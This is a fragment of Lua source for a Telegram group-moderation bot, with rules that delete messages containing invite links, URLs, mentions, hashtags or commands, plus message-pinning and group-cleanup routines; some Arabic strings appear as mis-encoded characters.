if text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."Lock:Link"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."Lock:Link"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."Lock:Link"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."Lock:Link"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
end 
------------------------------------------------------------------------
if text and text:match("[hH][tT][tT][pP][sT]") or text and text:match("[tT][eE][lL][eE][gG][rR][aA].[Pp][Hh]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa].[Pp][Hh]") then
if database:get(bot_id.."Lock:Link"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
end 
------------------------------------------------------------------------
if text and text:match("(.*)(@)(.*)") then
if database:get(bot_id.."Lock:User:Name"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text and text:match("@") then
if database:get(bot_id.."Lock:User:Name"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
end 
------------------------------------------------------------------------
if text and text:match("(.*)(#)(.*)") then
if database:get(bot_id.."Lock:hashtak"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
end 
------------------------------------------------------------------------
if text and text:match("#") then
if database:get(bot_id.."Lock:hashtak"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
end 
------------------------------------------------------------------------
if text and text:match("/") then
if database:get(bot_id.."Lock:Cmd"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
end 
if text and text:match("(.*)(/)(.*)") then
if database:get(bot_id.."Lock:Cmd"..msg.chat_id_) then
DeleteMessage(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
--------
if text then
local Tshake_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..result.chat_id_) 
if Tshake_Msg then 
Reply_Status(result,result.sender_user_id_,"reply","Ω­ "..Tshake_Msg) 
DeleteMessage(result.chat_id_, {[0] = data.message_id_}) 
return false
end
end
end
end,nil)
------------------------------------------------------------------------
if text and not Special(msg) then  
local BoykA1_Msg = database:get(bot_id.."Mahmoud1:Add:Filter:Rp1"..text..msg.chat_id_)   
if BoykA1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *Ω­Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω Β»* ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Revorb0t')..') \n Ω­'..BoykA1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end,nil)
end
end
----------------
if text and not Special(msg) then  
local BoykA1_Msg = database:get(bot_id.."Mahmoud1:Add:Filter:Rp2"..text..msg.chat_id_)   
if BoykA1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *Ω­Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω Β»* ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Revorb0t')..') \n Ω­'..BoykA1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end,nil)
end
end
------------------------------------------------------------------------
elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local Get_Msg_Pin = database:get(bot_id..'Msg:Pin:Chat'..msg.chat_id_)
if Get_Msg_Pin ~= nil then
if text == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) if d.ID == 'Ok' then;database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_);end;end,nil) 
elseif (msg.content_.sticker_) then 
if Get_Msg_Pin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil) 
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil) 
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil) 
end
end
end
end
if (data.ID == "UpdateOption" and data.value_.value_ == "Ready") then
print('\27[30;32mΒ»Β» ΩΨ±Ψ¬Ω Ψ§ΩΨ§ΩΩΨͺΨΆΨ§Ψ± ΩΨ­ΩΩ ΨͺΩΨΈΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ Ψ§ΩΩΩΩΩΩ Β«Β«\n\27[1;37m')
local list = database:smembers(bot_id..'UsersBot') 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end 
local list = database:smembers(bot_id..'Chek:Groups') 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
database:srem(bot_id..'Chek:Groups',v) 
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',v) 
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',v) 
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',v) 
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id..'Chek:Groups',v) 
end end,nil)
end;end;end
